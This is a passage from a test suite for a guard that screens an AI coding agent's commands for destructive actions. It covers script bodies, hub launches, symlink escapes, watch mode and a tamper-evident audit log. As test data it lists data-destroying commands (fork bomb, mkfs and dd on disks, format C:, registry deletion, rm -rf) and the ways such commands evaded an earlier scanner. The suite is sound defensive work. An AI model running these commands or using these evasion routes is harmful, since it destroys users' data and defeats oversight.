// Coverage suite — the channels a destructive command can hide in.
//
// Written from a real session: the command-string scanner blocked `command -v rm`
// (a harmless probe) while `sh ./loop.sh` — the script that actually held the
// delete loop — passed through untouched, and the same payload launched through
// `hub start` was never looked at at all. Every case here is that session or a
// one-step variation of it.
import * as fs from "node:fs";
import * as path from "node:path";
import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { fileURLToPath } from "node:url";
import { loadExt, makeCtx, callTool, bash, mkHome, fakeRegistry, installFetch, fetchResponse, checkerRequests, check, report, dialogDefects, confirmLog, selectLog, overlayLog, EXT_PATH } from "./harness.mjs";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const AUDIT = path.join(HERE, "..", "tools", "dc-audit.mjs");
const HOME = mkHome("cover");
const PROJ = path.join(HOME, "proj");
const LOG = path.join(HOME, ".omp", "logs", "destructive-check.jsonl");
const SHARED = path.join(HOME, ".omp", "shared");
const INSTALLED = path.join(SHARED, "destructive-check.ts");
const MANIFEST = path.join(SHARED, "destructive-check.manifest.json");
const REG = fakeRegistry([["opencode-go", "deepseek-v4.1-flash"]]);

// The scratch project must not look like an artifact directory: the guard treats
// names such as tmp/temp/build/coverage as disposable, which would change what
// several cases below are actually testing.
const cfg = (extra = {}) => ({
  enabled: true,
  mode: "hard",
  provider: "opencode-go",
  providers: { "opencode-go": { model: "deepseek-v4.1-flash" } },
  ...extra,
});

const stubFetch = () => installFetch(() => fetchResponse(200, { choices: [{ message: { content: "ALLOW: stub" } }] }));

async function run(event, { config = cfg(), cwd = PROJ, selects = [], hasUI = true } = {}) {
  stubFetch();
  const ext = await loadExt({ home: HOME, config, registry: REG });
  const ctx = makeCtx({ cwd, hasUI, selects: [...selects], registry: REG });
  const result = await callTool(ext, event, ctx);
  return { result, completions: checkerRequests().length, blocked: result?.block === true, reason: String(result?.reason ?? "") };
}

// Drives the /dc menu; returns the panels it opened. `extPath` runs the panel
// against the installed copy instead of the repository file.
async function dc({ selects = [], config = cfg(), cwd = PROJ, extPath } = {}) {
  stubFetch();
  const ext = await loadExt({ home: HOME, config, registry: REG, extPath });
  const ctx = makeCtx({ cwd, selects: [...selects], registry: REG });
  const before = confirmLog.length;
  await ext.commands.get("dc").handler("", ctx);
  return { panels: confirmLog.slice(before).map((c) => c.message), defects: dialogDefects() };
}

const cmd = (command) => bash(command, "cleanup");
const hub = (input) => ({ toolName: "hub", input });

// ------------------------------------------------------------------ fixtures --
fs.rmSync(PROJ, { recursive: true, force: true });
fs.rmSync(path.join(HOME, ".omp", "logs"), { recursive: true, force: true });
fs.rmSync(SHARED, { recursive: true, force: true });
fs.mkdirSync(path.join(PROJ, ".git"), { recursive: true });
fs.mkdirSync(path.join(PROJ, "src"), { recursive: true });
fs.writeFileSync(path.join(PROJ, "src", "app.js"), "// the work the agent must not lose\n");
const script = (name, body) => fs.writeFileSync(path.join(PROJ, name), body);
script("loop.sh", "#!/usr/bin/env bash\ncp src/app.js .loop_copy.tmp\nrm -f .loop_copy.tmp\n");
script("clean.sh", "#!/usr/bin/env bash\nnpm run build\necho bundled\n");
script("nested.sh", "sh ./deep.sh\n");
script("deep.sh", "rm -rf src\n");
script("deep2.sh", "sh ./deep3.sh\n");
script("deep3.sh", "sh ./deep4.sh\n");
script("deep4.sh", "rm -rf src\n");
script("self.sh", "rm -rf src\nsh ./self.sh\n");
script("wipe.sh", "#!/usr/bin/env bash\nmkfs.ext4 /dev/sda1\n");
fs.writeFileSync(path.join(PROJ, "big.sh"), `#!/usr/bin/env bash\n${"echo filler\n".repeat(7000)}`); // ~77 KiB
fs.writeFileSync(path.join(PROJ, "blob.sh"), Buffer.from("#!/bin/sh\n\0\u0001rm -rf src\n", "latin1"));

// ------------------------------------------------------------- script bodies --
{
  const p = await run(cmd("sh ./loop.sh"));
  check("script body: `sh ./loop.sh` is judged by what it runs", p.blocked && /insideDelete/.test(p.reason) && p.completions === 0, p.reason);
  check("script body: the report names the file and the hash of the bytes read", /loop\.sh sha256:[0-9a-f]{12}/.test(p.reason), p.reason);
}
{
  const p = await run(cmd("bash -x ./loop.sh"));
  check("script body: interpreter flags do not skip the body", p.blocked && /insideDelete/.test(p.reason), p.reason);
}
{
  const p = await run(cmd("./loop.sh"), { config: cfg({ mode: "medium" }) });
  check("script body: running the file directly is covered too", p.blocked && p.completions === 0, p.reason);
}
{
  const p = await run(cmd("sh ./clean.sh"));
  check("script body: a clean script stays quiet", !p.blocked && p.completions === 0, JSON.stringify(p.result));
}
{
  const p = await run(cmd("sh ./nested.sh"));
  check("script body: a script calling a destructive script is caught", p.blocked && /insideDelete/.test(p.reason), p.reason);
}
{
  const p = await run(cmd("sh ./deep2.sh"));
  check("script body: a chain past the analysis limit fails closed", p.blocked && /scriptExec/.test(p.reason) && /nested past the analysis limit/.test(p.reason), p.reason);
}
{
  const p = await run(cmd("sh ./self.sh"));
  check("script body: a self-calling script cannot loop the scan", p.blocked && /insideDelete/.test(p.reason), p.reason);
}
{
  const p = await run(cmd("sh ./missing.sh"));
  check("script body: an unreadable script is scriptExec, not a pass", p.blocked && /scriptExec/.test(p.reason) && /could not read/.test(p.reason) && p.completions === 0, p.reason);
}
{
  const p = await run(cmd("sh ./missing.sh"), { config: cfg({ mode: "medium" }) });
  check("script body: medium sends an unreadable script to the checker", p.completions === 1 && !p.blocked, JSON.stringify({ completions: p.completions, result: p.result }));
}
{
  const p = await run(cmd("sh ./big.sh"));
  check("script body: an oversized script is scriptExec", p.blocked && /could not read/.test(p.reason), p.reason);
}
{
  const p = await run(cmd("sh ./blob.sh"));
  check("script body: a binary file is scriptExec", p.blocked && /could not read/.test(p.reason), p.reason);
}
{
  const p = await run(cmd("sh ./wipe.sh"));
  check("script body: a catastrophic command inside a script is caught", p.blocked && /catastrophic/.test(p.reason), p.reason);
}

// -------------------------------------------------------------------- hub ----
{
  const p = await run(hub({ op: "start", application: "sh", args: ["-c", "rm -rf /etc"] }));
  check("hub: a launch is scanned like a command", p.blocked && /systemTarget/.test(p.reason) && p.completions === 0, p.reason);
}
{
  const p = await run(hub({ op: "start", application: "sh", args: ["-c", "rm -rf src"] }), { config: cfg({ mode: "medium" }) });
  check("hub: an inside-project delete in a launch is blocked", p.blocked && /insideDelete/.test(p.reason), p.reason);
}
{
  const p = await run(hub({ op: "start", application: "npm", args: ["run", "build"] }), { config: cfg({ mode: "medium" }) });
  check("hub: a benign launch stays quiet", !p.blocked && p.completions === 0, JSON.stringify(p.result));
}
{
  const p = await run(hub({ op: "list" }));
  check("hub: read-only operations are not analysed", !p.blocked && p.completions === 0, JSON.stringify(p.result));
}
{
  const p = await run(hub({ op: "start", application: "sh", args: ["-c", "rm -rf src"], detached: true }));
  check("hub: a detached launch is flagged as outliving the session", p.blocked && /outlives this session/.test(p.reason), p.reason);
}
{
  const p = await run(hub({ op: "start", application: "sh", args: ["-c", "rm -rf /etc"] }), { config: cfg({ coverage: { bash: true, eval: true, fileTools: true, processes: false } }) });
  check("hub: coverage.processes = off disables the channel", !p.blocked && p.completions === 0, JSON.stringify(p.result));
}
{
  const p = await run(hub({ op: "start", application: "sh", args: ["./loop.sh"] }));
  check("hub: a script launched through hub is read, not just named", p.blocked && /insideDelete/.test(p.reason) && /loop\.sh sha256:/.test(p.reason), p.reason);
}
{
  // `args` arrive as separate tokens: joining them with a space used to split a
  // destination that holds one ("My Docs") and read the last fragment as the path.
  const p = await run(hub({ op: "start", application: "cp", args: [path.join(PROJ, "src", "app.js"), path.join(HOME, "My Docs") + path.sep] }));
  check("hub: a destination containing a space is still the destination", p.blocked && /outsideWrite/.test(p.reason), p.reason);
}

// ----------------------------------------------------------------- probes ----
for (const command of ["command -v rm", "command -v unlink", "which rm", "type -p rm", "command -V shred"]) {
  const p = await run(cmd(command));
  check(`probe: \`${command}\` runs nothing and is not blocked`, !p.blocked && p.completions === 0, JSON.stringify(p.result));
}
{
  const p = await run(cmd("command -p rm -rf src"), { config: cfg({ mode: "medium" }) });
  check("probe: `command -p rm` still executes and is still judged", p.blocked && /insideDelete/.test(p.reason), p.reason);
}
{
  const p = await run(cmd("command -v rm && rm -rf src"), { config: cfg({ mode: "medium" }) });
  check("probe: the destructive half of a compound command is still judged", p.blocked && /insideDelete/.test(p.reason), p.reason);
}

// ----------------------------------------------------------- catastrophic ----
for (const [command, label] of [
  [":(){ :|:& };:", "fork bomb"],
  ["mkfs.ext4 /dev/sda1", "mkfs"],
  ["sudo mkfs -t ext4 /dev/sda1", "mkfs behind sudo"],
  ["dd if=/dev/zero of=/dev/sda bs=1M", "dd to a device"],
  ["format C: /q", "windows format"],
  ["diskpart", "diskpart"],
  ["shutdown /s /t 0", "shutdown"],
  ["reg delete HKLM\\Software\\Foo /f", "registry hive delete"],
  ["cipher /w:C:", "cipher wipe"],
  ['bash -c "mkfs.ext4 /dev/sda1"', "nested shell"],
]) {
  for (const mode of ["simple", "medium", "hard"]) {
    const p = await run(cmd(command), { config: cfg({ mode }) });
    check(`catastrophic [${mode}]: ${label}`, p.blocked && /catastrophic/.test(p.reason) && p.completions === 0, p.reason);
  }
}
for (const [command, label] of [
  ['git commit -m "shutdown the api"', "a quoted word in a commit message"],
  ['echo "mkfs.ext4 /dev/sda1"', "a quoted probe of a destructive string"],
  ["dd if=/dev/zero of=./zeros.bin bs=1M count=1", "dd writing a file, not a device"],
  ["grep -rn diskpart README.md", "a search for the word"],
  ["npm run format", "a formatter"],
]) {
  const p = await run(cmd(command), { config: cfg({ mode: "medium" }) });
  check(`catastrophic boundary: ${label} is not a hit`, !p.blocked && p.completions === 0, p.reason || JSON.stringify(p.result));
}

// -------------------------------------------------------------- audit log ----
{
  // Start from a known-empty log: "the file exists" would pass on a stale one
  // and assert nothing about this decision.
  fs.rmSync(LOG, { force: true });
  // The mode is pinned here, not inherited: this row asserts the mode the line
  // records, so it has to be the config that produced this line — a run that
  // started from a brand-new scratch root must see the same file as a reused one.
  const p = await run(cmd("rm -rf C:\\other\\project\\data"), { config: cfg({ mode: "hard" }) });
  const lines = fs.existsSync(LOG) ? fs.readFileSync(LOG, "utf8").split("\n").filter(Boolean) : [];
  check("audit: a blocked decision is appended to the log file", p.blocked && lines.length === 1, `${lines.length} line(s) in the log`);
  if (lines.length) {
    const last = JSON.parse(lines.at(-1));
    check(
      "audit: the line carries rule, action, command, cwd and a chained hash",
      last.rule === "outsideDelete" && last.action === "block" && /project/.test(String(last.command)) && last.cwd === PROJ && /^[0-9a-f]{64}$/.test(last.chain) && last.mode === "hard",
      JSON.stringify(last),
    );
    const reportText = execFileSync(process.execPath, [AUDIT, "--file", LOG], { encoding: "utf8" });
    check("audit: the standalone verifier reads the chain as intact", /chain {3}: intact/.test(reportText), reportText);
  } else {
    check("audit: the line carries rule, action, command, cwd and a chained hash", false, "nothing was written");
    check("audit: the standalone verifier reads the chain as intact", false, "nothing was written");
  }
}
{
  // A second decision, so the tamper case has a line that is not the last one.
  const second = await run(cmd("rm -rf C:\\another\\project\\data"));
  const lines = fs.existsSync(LOG) ? fs.readFileSync(LOG, "utf8").split("\n").filter(Boolean) : [];
  const tampered = path.join(HOME, "tampered.jsonl");
  let status = 0;
  let output = "";
  if (second.blocked && lines.length >= 2) {
    const edit = JSON.parse(lines[0]);
    edit.action = "allow";
    lines[0] = JSON.stringify(edit);
    fs.writeFileSync(tampered, `${lines.join("\n")}\n`);
    try {
      output = execFileSync(process.execPath, [AUDIT, "--file", tampered], { encoding: "utf8" });
    } catch (err) {
      status = err.status;
      output = `${err.stdout ?? ""}${err.stderr ?? ""}`;
    }
  }
  check("audit: editing a written line is reported as a broken chain", status === 1 && /BROKEN/.test(output), output || "no log to tamper with");
}
{
  const { panels, defects } = await dc({ selects: ["History", "audit log entries", "verify the audit chain", "back", "close"] });
  const panel = panels.at(-1) ?? "";
  check("/dc: the audit panel reports entries and chain state", /entries\s*:\s*\d+/.test(panel) && /chain\s*:\s*(intact|BROKEN)/.test(panel), panel);
  check("/dc: every dialogue explains its options", defects.length === 0, defects.join("; "));
}
{
  // Rotation: the log is renamed to .1 and the new file starts its own chain —
  // if the first line pointed at the old file's hash, every rotation would look
  // like tampering to the verifier.
  const rotated = `${LOG}.1`;
  fs.rmSync(rotated, { force: true });
  fs.writeFileSync(LOG, `${"x".repeat(5 * 1024 * 1024)}\n`);
  const p = await run(cmd("rm -rf C:\\other\\project\\data"));
  check("audit: the log rotates at 5 MiB and keeps the previous file", p.blocked && fs.existsSync(rotated) && fs.existsSync(LOG) && fs.statSync(LOG).size < 1024, `rotated=${fs.existsSync(rotated)} size=${fs.existsSync(LOG) ? fs.statSync(LOG).size : -1}`);
  const firstLine = fs.existsSync(LOG) ? String(fs.readFileSync(LOG, "utf8").split("\n").filter(Boolean)[0] ?? "") : "";
  let first = {};
  try {
    first = JSON.parse(firstLine);
  } catch {
    first = {};
  }
  check("audit: the first line after rotation starts a fresh chain", first.prev === "", JSON.stringify({ prev: first.prev ?? null }));
  let reportText = "";
  try {
    reportText = execFileSync(process.execPath, [AUDIT, "--file", LOG], { encoding: "utf8" });
  } catch (err) {
    reportText = `${err.stdout ?? ""}${err.stderr ?? ""}`;
  }
  check("audit: the verifier reads the post-rotation file as intact", /chain {3}: intact/.test(reportText), reportText);
}

// --------------------------------------------------------- guard integrity ----
// The integrity check hashes the file that is *running*, so these cases install a
// real copy into the fake home and load the extension from there.
try {
  fs.mkdirSync(SHARED, { recursive: true });
  fs.copyFileSync(EXT_PATH, INSTALLED);
  const manifestOf = (file) => createHash("sha256").update(fs.readFileSync(file)).digest("hex");
  fs.writeFileSync(MANIFEST, JSON.stringify({ sha256: manifestOf(INSTALLED), installedAt: "2026-09-11T00:00:00.000Z", version: "2.4" }));
  {
    const { panels } = await dc({ selects: ["Advanced & diagnostics", "Guard files", "integrity: ok", "back", "back", "close"], extPath: INSTALLED });
    const panel = panels.at(-1) ?? "";
    check("guard integrity: a matching install reports ok", /state\s*: ok/.test(panel), panel);
    check("guard integrity: the panel names the loaded file", panel.includes(INSTALLED), panel);
  }
  {
    // Appended, not replaced: the panel has to run against a file the host can
    // still load, and an extra comment is a real edit with a new hash.
    fs.appendFileSync(INSTALLED, "\n// edited after the install, off the books\n");
    const { panels } = await dc({ selects: ["Advanced & diagnostics", "Guard files", "integrity: changed", "back", "back", "close"], extPath: INSTALLED });
    const panel = panels.at(-1) ?? "";
    check("guard integrity: an edit after the install reports changed", /state\s*: changed/.test(panel) && /install\.mjs --force/.test(panel), panel);
  }
  {
    // A copy with no manifest next to it is "unmanaged" — never a passing hash
    // taken from a manifest that describes some other file.
    fs.rmSync(MANIFEST, { force: true });
    const { panels } = await dc({ selects: ["Advanced & diagnostics", "Guard files", "integrity: unmanaged", "back", "back", "close"], extPath: INSTALLED });
    const panel = panels.at(-1) ?? "";
    check("guard integrity: a copy with no manifest is unmanaged, not ok", /state\s*: unmanaged/.test(panel), panel);
  }
  {
    fs.copyFileSync(EXT_PATH, INSTALLED);
    fs.writeFileSync(MANIFEST, JSON.stringify({ sha256: manifestOf(INSTALLED), installedAt: "2026-09-11T00:00:00.000Z", version: "2.4" }));
    await dc({ selects: ["Advanced & diagnostics", "Guard files", "lock: destructive-check.ts: writable · destructive-check.json: writable", "lock the guard only", "back", "back", "close"], extPath: INSTALLED });
    check("guard lock: locking leaves the installed file read-only", (fs.statSync(INSTALLED).mode & 0o200) === 0, `mode ${fs.statSync(INSTALLED).mode.toString(8)}`);
    check("guard lock: the config stays writable when only the guard is locked", (fs.statSync(path.join(HOME, ".omp", "destructive-check.json")).mode & 0o200) !== 0, "");
    await dc({ selects: ["Advanced & diagnostics", "Guard files", "lock: destructive-check.ts: read-only · destructive-check.json: writable", "unlock both files", "back", "back", "close"], extPath: INSTALLED });
    check("guard lock: unlocking restores a writable file", (fs.statSync(INSTALLED).mode & 0o200) !== 0, `mode ${fs.statSync(INSTALLED).mode.toString(8)}`);
  }
  {
    fs.writeFileSync(`${INSTALLED}.bak`, "// the previous guard\n");
    const { panels } = await dc({ selects: ["Advanced & diagnostics", "Guard files", "restore the previous guard (.bak)", "back", "back", "close"], extPath: INSTALLED });
    check("guard restore: the previous copy is written back", fs.readFileSync(INSTALLED, "utf8") === "// the previous guard\n", fs.readFileSync(INSTALLED, "utf8"));
    check("guard restore: the panel says a restart is needed", /Restart the omp session/.test(panels.at(-1) ?? ""), panels.at(-1) ?? "");
  }
} finally {
  try {
    fs.chmodSync(INSTALLED, 0o644);
    fs.rmSync(INSTALLED, { force: true });
    fs.rmSync(MANIFEST, { force: true });
    fs.rmSync(`${INSTALLED}.bak`, { force: true });
  } catch {
    /* scratch cleanup */
  }
}

// ------------------------------------------------------------ watch mode ----
// `dryRun` computes and logs every decision and enforces none of them: the audit
// line says would-block and the status line says WATCH, so a calibration run can
// never be mistaken for a session where the guard actually refused something.
{
  fs.rmSync(LOG, { force: true });
  stubFetch();
  const ext = await loadExt({ home: HOME, config: cfg({ mode: "hard", dryRun: true }), registry: REG });
  const ctx = makeCtx({ cwd: PROJ, registry: REG });
  const result = await callTool(ext, cmd("rm -rf src"), ctx);
  check("watch: an inside delete is not enforced", result === undefined, JSON.stringify(result));
  check("watch: the status line says WATCH and the rule", ctx.statuses.some((s) => String(s.text) === "dc: WATCH · would block: insideDelete"), JSON.stringify(ctx.statuses));
  const lines = fs.existsSync(LOG) ? fs.readFileSync(LOG, "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l)) : [];
  const last = lines.at(-1) ?? {};
  check("watch: the audit line says would-block, not block", last.action === "would-block" && last.rule === "insideDelete", JSON.stringify(last));
  check("watch: the decision is still written down once", lines.length === 1, `${lines.length} line(s)`);
}
{
  // An `ask` action must not reach the user in watch mode — the stub answers
  // "block" when nothing is queued, so a prompt would show up as a block.
  stubFetch();
  const ext = await loadExt({ home: HOME, config: cfg({ mode: "custom", rules: { insideDelete: "ask" }, dryRun: true }), registry: REG });
  const ctx = makeCtx({ cwd: PROJ, registry: REG });
  const result = await callTool(ext, cmd("rm -rf src"), ctx);
  check("watch: an ask-action is not put to the user", result === undefined, JSON.stringify(result));
}
{
  // A model-action rule is still put to the checker (that is what the run is
  // for) and a denial is recorded without being enforced.
  installFetch(() => fetchResponse(200, { choices: [{ message: { content: "DENY: would lose work" } }] }));
  const ext = await loadExt({ home: HOME, config: cfg({ mode: "custom", rules: { outsideDelete: "model" }, dryRun: true, askOnDeny: true }), registry: REG });
  const ctx = makeCtx({ cwd: PROJ, registry: REG });
  const result = await callTool(ext, cmd("rm -rf C:\\other\\project\\data"), ctx);
  check("watch: a model denial is computed, not enforced", result === undefined && checkerRequests().length === 1, JSON.stringify(result));
  const lines = fs.existsSync(LOG) ? fs.readFileSync(LOG, "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l)) : [];
  const last = lines.at(-1) ?? {};
  check("watch: the model denial is recorded as would-block", last.action === "would-block" && /would lose work/.test(String(last.detail ?? "")), JSON.stringify(last));
}
{
  process.env.OMP_DC_DRYRUN = "1";
  try {
    const p = await run(cmd("rm -rf src"), { config: cfg({ mode: "hard" }) });
    check("watch: OMP_DC_DRYRUN=1 turns watch mode on", !p.blocked && p.result === undefined, JSON.stringify(p.result));
  } finally {
    delete process.env.OMP_DC_DRYRUN;
  }
  const enforced = await run(cmd("rm -rf src"), { config: cfg({ mode: "hard" }) });
  check("watch: without the override the same delete blocks again", enforced.blocked, JSON.stringify(enforced.result));
}
{
  // It cannot be left on silently: session_start says so, and the resting status
  // line carries the mode.
  stubFetch();
  const ext = await loadExt({ home: HOME, config: cfg({ mode: "hard", dryRun: true }), registry: REG });
  const ctx = makeCtx({ cwd: PROJ, registry: REG });
  for (const handler of ext.handlers.get("session_start") ?? []) await handler({}, ctx);
  check("watch: session_start warns that nothing is enforced", ctx.notes.some((n) => n.level === "warning" && /WATCH/.test(String(n.message))), JSON.stringify(ctx.notes).slice(0, 240));
  check("watch: the resting status line says WATCH", ctx.statuses.some((s) => /^dc: WATCH/.test(String(s.text))), JSON.stringify(ctx.statuses));
  // The warning is a fact about the policy, not about a session: every child
  // session fires session_start, and a subagent is not a new reason to warn.
  const child = makeCtx({ cwd: PROJ, registry: REG });
  for (const handler of ext.handlers.get("session_start") ?? []) await handler({}, child);
  check("watch: a child session does not repeat the warning", child.notes.length === 0, JSON.stringify(child.notes).slice(0, 240));
}
{
  // A guard that is switched off is a setting its owner made: the status line
  // says `dc: off` and no warning is announced. Warning on every session meant
  // every subagent repeated a notice the user had already answered.
  stubFetch();
  const ext = await loadExt({ home: HOME, config: cfg({ enabled: false }), registry: REG });
  const parent = makeCtx({ cwd: PROJ, registry: REG });
  const child = makeCtx({ cwd: PROJ, registry: REG });
  for (const handler of ext.handlers.get("session_start") ?? []) await handler({}, parent);
  for (const handler of ext.handlers.get("session_start") ?? []) await handler({}, child);
  check("inert: a guard that is switched off announces nothing", parent.notes.length === 0 && child.notes.length === 0, JSON.stringify([...parent.notes, ...child.notes]).slice(0, 240));
  check("inert: the off state shows on the status line instead", parent.statuses.some((s) => /^dc: off/.test(String(s.text))), JSON.stringify(parent.statuses));
  // And it does not come back at the end of the session as an "could not enforce"
  // gap: a guard that judged nothing has no gap, and the doctor still lists it.
  for (const handler of ext.handlers.get("session_stop") ?? []) await handler({}, parent);
  check("inert: the session end does not chase the same setting", parent.notes.length === 0, JSON.stringify(parent.notes).slice(0, 240));
}
{
  // The trap that *does* deserve a notice — a policy whose channels are all out
  // of scope, which looks armed — says it once per process, not once per session.
  stubFetch();
  const config = cfg({ coverage: { bash: false, eval: false, fileTools: false, processes: false } });
  const ext = await loadExt({ home: HOME, config, registry: REG });
  const parent = makeCtx({ cwd: PROJ, registry: REG });
  const child = makeCtx({ cwd: PROJ, registry: REG });
  for (const handler of ext.handlers.get("session_start") ?? []) await handler({}, parent);
  for (const handler of ext.handlers.get("session_start") ?? []) await handler({}, child);
  check("inert: a policy that cannot stop anything says so once", parent.notes.filter((n) => /inert/.test(String(n.message))).length === 1, JSON.stringify(parent.notes).slice(0, 240));
  check("inert: the child session stays quiet", child.notes.length === 0, JSON.stringify(child.notes).slice(0, 240));
}
{
  const { defects } = await dc({ selects: ["Safety & approvals", (options) => options.map((o) => o.label).find((l) => l.startsWith("watch"))], config: cfg({ mode: "hard" }) });
  const written = JSON.parse(fs.readFileSync(path.join(HOME, ".omp", "destructive-check.json"), "utf8"));
  check("/dc: watch mode toggles and persists", written.dryRun === true, JSON.stringify(written));
  // The row has to explain *what* it does, not just carry a label: read the
  // description the menu shipped with the watch entry.
  const watchRow = selectLog.flatMap((call) => call.options).find((option) => /watch|dry-run/i.test(String(option?.label ?? "")));
  const description = String(watchRow?.description ?? "");
  check("/dc: the watch entry explains itself", defects.length === 0 && /dry-run|WATCH|block|enforc/i.test(description), `${JSON.stringify(watchRow ?? null).slice(0, 160)} | ${defects.join("; ")}`);
}

// ---------------------------------------------------- realpath scope (P0.3) ---
// A link inside the project that points outside it is classified where it lands,
// not where it is spelled — and the other way round.
{
  const OUT = path.join(HOME, "outside");
  const insideDir = path.join(OUT, "data");
  const projectDir = path.join(PROJ, "src", "deep");
  fs.mkdirSync(insideDir, { recursive: true });
  fs.mkdirSync(projectDir, { recursive: true });
  fs.writeFileSync(path.join(insideDir, "keep.txt"), "data outside the project\n");
  fs.writeFileSync(path.join(projectDir, "keep.txt"), "data inside the project\n");
  const makeLink = (target, link) => {
    // A previous run of this suite leaves the links behind: clear the path
    // without following it (unlink/rmdir act on the link, never the target).
    for (const clear of [() => fs.unlinkSync(link), () => fs.rmdirSync(link)]) {
      try {
        clear();
      } catch {
        /* nothing to clear */
      }
    }
    for (const type of process.platform === "win32" ? ["junction", "dir"] : ["dir", undefined]) {
      try {
        fs.symlinkSync(target, link, type);
        return true;
      } catch {
        /* try the next flavor */
      }
    }
    return false;
  };
  const linkOut = path.join(PROJ, "link-out");
  const linkIn = path.join(OUT, "link-in");
  const linkHome = path.join(OUT, "link-home");
  const linked = makeLink(insideDir, linkOut) && makeLink(projectDir, linkIn);
  if (!linked) {
    console.log("  SKIP realpath: this platform cannot create a directory link in the scratch dir");
  } else {
    const out = await run(cmd(`rm -rf "${path.join(linkOut, "keep.txt")}"`), { config: cfg({ mode: "simple" }) });
    check("realpath: a link inside the project that points outside is outside", out.blocked && /outsideDelete/.test(out.reason) && out.completions === 0, out.reason);
    const back = await run(cmd(`rm -rf "${path.join(linkIn, "keep.txt")}"`), { config: cfg({ mode: "simple" }) });
    check("realpath: a link outside that points into the project is inside", !back.blocked && back.completions === 0, JSON.stringify(back.result));
    const link = await run(cmd(`rm -rf "${linkOut}"`), { config: cfg({ mode: "simple" }) });
    check("realpath: the link path itself is judged where it lands", link.blocked && /outsideDelete/.test(link.reason), link.reason);
  }
  if (makeLink(HOME, linkHome)) {
    const p = await run(cmd(`rm -rf "${path.join(linkHome, "probe.txt")}"`), { config: cfg({ mode: "simple", allowDirs: [linkHome] }) });
    check("allowDirs: a link that resolves to the home is refused", p.blocked && p.completions === 0, `${linkHome} → ${JSON.stringify(p.result)?.slice(0, 160)}`);
  } else {
    console.log("  SKIP allowDirs link: this platform cannot create a directory link in the scratch dir");
  }
}

// ------------------------------------------- realpath cache (write targets) ---
// The cache holds what the filesystem *answered*, never a forecast for a path
// that does not exist yet: a spelling pre-resolved before a link appeared has to
// be re-resolved after it, or a write that lands outside the project is judged
// inside for the whole TTL. Both calls share one module instance, which is what
// makes the second one hit the cache the first one filled.
{
  const OUT = path.join(HOME, "stale-outside");
  const esc = path.join(PROJ, "esc");
  fs.rmSync(OUT, { recursive: true, force: true });
  fs.mkdirSync(OUT, { recursive: true });
  for (const clear of [() => fs.unlinkSync(esc), () => fs.rmdirSync(esc)]) {
    try {
      clear();
    } catch {
      /* nothing to clear */
    }
  }
  stubFetch();
  const ext = await loadExt({ home: HOME, config: cfg({ mode: "hard" }), registry: REG });
  const ctx = makeCtx({ cwd: PROJ, registry: REG });
  const target = path.join(esc, "payload.js");
  const before = await callTool(ext, { toolName: "write", input: { path: target, content: "x" } }, ctx);
  let linked = false;
  for (const type of process.platform === "win32" ? ["junction", "dir"] : ["dir", undefined]) {
    try {
      fs.symlinkSync(OUT, esc, type);
      linked = true;
      break;
    } catch {
      /* try the next flavor */
    }
  }
  const after = linked ? await callTool(ext, { toolName: "write", input: { path: target, content: "x" } }, ctx) : undefined;
  if (!linked) console.log("  SKIP realpath cache: this platform cannot create a directory link in the scratch dir");
  else {
    check("realpath cache: a path that does not exist yet is a clean pass", before === undefined, JSON.stringify(before));
    check("realpath cache: the same spelling is re-resolved after a link appears", after?.block === true && /outsideWrite/.test(String(after?.reason ?? "")), JSON.stringify(after));
  }
  try {
    fs.rmdirSync(esc);
  } catch {
    /* scratch cleanup */
  }
}

// ------------------------------------------- the second chance (audit) ------
// The loop's whole value is that it leaves a record: what the agent claimed, who
// allowed it, what the guard verified, and where the bytes went instead.
{
  const home = path.join(HOME, "loop");
  const log = path.join(home, ".omp", "logs", "destructive-check.jsonl");
  const CWD = path.join(home, "proj");
  fs.rmSync(home, { recursive: true, force: true });
  fs.mkdirSync(path.join(CWD, "src"), { recursive: true });
  fs.writeFileSync(path.join(CWD, "src", "keep.txt"), "untracked user work\n");
  const config = cfg({ mode: "custom", rules: { insideDelete: "model" }, askOnDeny: false });
  const gitArgs = { status: "", log: `${"a".repeat(40)}\n`, "check-ignore": 0 };
  const exec = async (cmd, args) => {
    const sub = args.find((a) => gitArgs[a] !== undefined) ?? args[0];
    return { stdout: gitArgs[sub] ?? "", stderr: "", code: 0, killed: false };
  };
  const verdict = (obj) => fetchResponse(200, { choices: [{ message: { content: JSON.stringify(obj) } }] });
  installFetch((_url, init) => (String(init.body).includes("SECOND CHANCE") ? verdict({ decision: "allow", confidence: "high", reason: "the target is committed", claims: [{ type: "committed", value: "src" }] }) : fetchResponse(200, { choices: [{ message: { content: "DENY: untracked work would be lost" } }] })));
  const ext = await loadExt({ home, config, registry: REG, exec });
  const said = (text) => [{ message: { role: "assistant", content: [{ type: "text", text }] } }];
  // A missing or truncated log is an empty log here: the rows below assert what
  // it should contain, so a build that stops appending has to *fail* them rather
  // than take the suite down before it prints its report.
  const readLog = () => {
    try {
      return fs
        .readFileSync(log, "utf8")
        .trim()
        .split("\n")
        .filter(Boolean)
        .map((line) => JSON.parse(line));
    } catch {
      return [];
    }
  };
  await callTool(ext, bash("rm -rf src"), makeCtx({ cwd: CWD, hasUI: false, registry: REG, branch: said("first") }));
  const second = await callTool(ext, bash("rm -rf src"), makeCtx({ cwd: CWD, hasUI: false, registry: REG, branch: said("src is committed, nothing untracked lives there") }));
  check("second chance: the justified repeat is allowed", second?.block !== true, JSON.stringify(second));
  const entry = readLog().at(-1) ?? {};
  check("second chance: the audit line records the attempt", entry.attempt === 2, JSON.stringify(entry));
  check("second chance: the audit line records the authority", entry.authority === "model", JSON.stringify(entry));
  check("second chance: the audit line records the justification, not just its length", /^[0-9a-f]{31}/.test(String(entry.justificationHash)) && entry.justificationLen > 20, JSON.stringify(entry));
  check("second chance: the audit line records the claim and its verdict", String(entry.claims).startsWith("committed") && entry.justification === true, JSON.stringify(entry));
  check("second chance: the audit line records where the delete went", /dc-trash/.test(String(entry.recovery)), JSON.stringify(entry));
  // The chain covers the new fields: recomputing it without them must not match.
  const { chain, ...core } = entry;
  check("second chance: the new fields are inside the hashed payload", createHash("sha256").update(JSON.stringify(core)).digest("hex") === chain, String(chain));
  check("second chance: the rewritten command moves the target into the trash", /mv -- "src"/.test(String(second?.input?.command ?? "")), String(second?.input?.command ?? ""));
  check("second chance: the trash directory was created on disk", fs.existsSync(path.join(home, ".omp", "dc-trash")), path.join(home, ".omp", "dc-trash"));

  // A claim that was verified and then contradicted is what erosion acts on: the
